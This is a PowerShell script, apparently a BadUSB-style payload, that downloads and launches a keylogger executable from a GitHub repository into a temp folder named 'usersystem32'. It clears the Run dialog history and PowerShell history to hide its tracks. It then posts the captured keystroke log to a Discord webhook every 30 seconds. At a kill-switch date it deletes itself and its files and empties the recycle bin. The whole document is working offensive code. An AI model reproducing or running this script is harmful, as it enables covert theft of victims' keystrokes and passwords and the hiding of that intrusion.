param (
    [string]$webhookUrl,
    [string]$exe,
    [datetime]$killSwitch
)

if (-not $webhookUrl) {
    # Write-Error "Webhook URL is required. Use -webhookUrl to specify it."
    exit 1
}

$exeExe = "$exe.exe"
$exeUrl = "https://github.com/tpazz/Cute-Little-Duckies/raw/main/keylogger/$exeExe"
$TempDir = [System.IO.Path]::GetTempPath()
$DirFilePath = Join-Path -Path $TempDir -ChildPath "usersystem32"
$ExeFilePath = Join-Path -Path $DirFilePath -ChildPath $exeExe
$TxtFilePath = Join-Path -Path $DirFilePath -ChildPath "usersystem32.txt"

# Create the new directory if it doesn't exist
if (-not (Test-Path -Path $DirFilePath)) {
    mkdir $DirFilePath | Out-Null 
}

Invoke-WebRequest $exeUrl -OutFile $ExeFilePath;
Start-Process -FilePath $ExeFilePath -WorkingDirectory $DirFilePath;

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f | Out-Null 
Remove-Item (Get-PSreadlineOption).HistorySavePath 

while ($true) {
    Start-Sleep -Seconds 30
    $currentTime = Get-Date
    if ($killSwitch -and $currentTime -ge $killSwitch) {
        Stop-Process -Name $exe -Force
        Start-Sleep -Seconds 2
        Remove-Item -LiteralPath $DirFilePath -Force -Recurse -ErrorAction SilentlyContinue
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f | Out-Null 
        clear
        Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
        Remove-Item $MyInvocation.MyCommand.Source
        exit
    }

     try {
        $fileContent = Get-Content -Path $TxtFilePath -Raw
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = "--$boundary`r`n" +
                "Content-Disposition: form-data; name=`"file1`"; filename=`"usersystem32.txt`"`r`n" +
                "Content-Type: text/plain`r`n`r`n" +
                "$fileContent`r`n" +
                "--$boundary--"

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        # Send the POST request to the Discord webhook
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body | Out-Null

        #Write-Output "File uploaded at $(Get-Date)"
    } catch {
        #Write-Error "Failed to upload file: $_"
    }
}
